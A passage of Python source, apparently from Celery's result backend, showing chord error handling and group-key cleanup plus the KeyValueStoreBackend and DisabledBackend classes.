                    reason = 'Dependency {0.id} raised {1!r}'.format(
                        culprit, exc,
                    )
                except StopIteration:
                    reason = repr(exc)
                logger.exception('Chord %r raised: %r', gid, reason)
                chord_error = _create_chord_error_with_cause(message=reason, original_exc=exc)
                self.chord_error_from_stack(callback=callback, exc=chord_error)
            else:
                try:
                    callback.delay(ret)
                except Exception as exc:  # pylint: disable=broad-except
                    logger.exception('Chord %r raised: %r', gid, exc)
                    chord_error = _create_chord_error_with_cause(
                        message=f'Callback error: {exc!r}', original_exc=exc
                    )
                    self.chord_error_from_stack(callback=callback, exc=chord_error)
            finally:
                deps.delete()
                self.delete(key)
                pending_key = self.get_key_for_group(gid, '.pending')
                pending_raw = self.get(pending_key)
                reference_ids = []
                if pending_raw is not None:
                    pending_payload = self.decode(pending_raw)
                    reference_ids.extend(pending_payload.get('task_ids', ()))
                    if pending_payload.get('body_task_id'):
                        reference_ids.append(pending_payload['body_task_id'])
                    self.delete(pending_key)
                for reference_id in set(reference_ids):
                    self._remove_result_reference(reference_id, gid)
        else:
            self.expire(key, self.expires)


class KeyValueStoreBackend(BaseKeyValueStoreBackend, SyncBackendMixin):
    """Result backend base class for key/value stores."""


class DisabledBackend(BaseBackend):
    """Dummy result backend."""

    _cache = {}  # need this attribute to reset cache in tests.

    def store_result(self, *args, **kwargs):
        pass

    def ensure_chords_allowed(self):
        raise NotImplementedError(E_CHORD_NO_BACKEND.strip())

    def _is_disabled(self, *args, **kwargs):
        raise NotImplementedError(E_NO_BACKEND.strip())

    def as_uri(self, *args, **kwargs):
        return 'disabled://'

    get_state = get_status = get_result = get_traceback = _is_disabled
    get_task_meta_for = wait_for = get_many = _is_disabled
